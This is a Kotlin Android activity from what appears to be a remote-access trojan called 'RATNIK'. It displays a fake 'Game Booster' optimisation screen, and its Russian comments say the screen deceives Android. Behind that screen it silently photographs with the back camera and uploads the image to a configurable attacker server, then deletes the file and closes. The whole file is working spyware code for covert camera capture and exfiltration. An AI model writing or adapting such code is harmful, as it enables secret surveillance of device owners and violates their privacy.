package com.ratnik.app

import android.graphics.Color
import android.os.Bundle
import android.util.Log
import android.view.Gravity
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class CameraActivity : AppCompatActivity() {
    private var imageCapture: ImageCapture? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Делаем экран черным с надписью. Это обманет Android, он будет думать, что юзер открыл приложение
        val text = TextView(this)
        text.text = "Game Booster\nОптимизация..."
        text.setTextColor(Color.WHITE)
        text.textSize = 20f
        text.gravity = Gravity.CENTER
        text.setBackgroundColor(Color.BLACK)
        setContentView(text)

        // Запускаем камеру с задержкой 1 сек, чтобы окно успело прогрузиться
        text.postDelayed({
            startCamera()
        }, 1000)
    }

    private fun startCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)

        cameraProviderFuture.addListener({
            try {
                val cameraProvider = cameraProviderFuture.get()
                
                // Настройка захвата фото
                imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                // Выбираем заднюю камеру
                val cameraSelector = CameraSelector.DEFAULT_BACK_CAMERA

                // Привязываем к жизненному циклу
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)

                // Делаем снимок
                takePhoto()
                
            } catch (e: Exception) {
                Log.e("RATNIK", "Ошибка инициализации камеры: ${e.message}")
                finish()
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun takePhoto() {
        val imageCapture = imageCapture ?: return
        val photoFile = File(cacheDir, "snap.jpg")

        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        imageCapture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(this),
            object : ImageCapture.OnImageSavedCallback {
                override fun onError(exc: ImageCaptureException) {
                    Log.e("RATNIK", "Ошибка снимка: ${exc.message}")
                    finish()
                }

                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    Log.d("RATNIK", "Фото сохранено, отправляем...")
                    uploadPhoto(photoFile)
                }
            }
        )
    }

    private fun uploadPhoto(file: File) {
        val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).build()
        val serverUrl = "http://127.0.0.1:8080" // Твой IP

        try {
            val requestBody = file.asRequestBody("image/jpeg".toMediaTypeOrNull())
            val multipartBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", "snap.jpg", requestBody)
                .build()

            val request = Request.Builder()
                .url("$serverUrl/upload")
                .post(multipartBody)
                .build()

            // Отправляем в фоновом потоке
            Thread {
                try {
                    client.newCall(request).execute().use { }
                    file.delete()
                    Log.d("RATNIK", "Фото успешно отправлено")
                } catch (e: Exception) {
                    Log.e("RATNIK", "Ошибка сети: ${e.message}")
                } finally {
                    runOnUiThread { finish() } // Закрываем экран
                }
            }.start()

        } catch (e: Exception) {
            Log.e("RATNIK", "Ошибка формирования запроса: ${e.message}")
            finish()
        }
    }
}
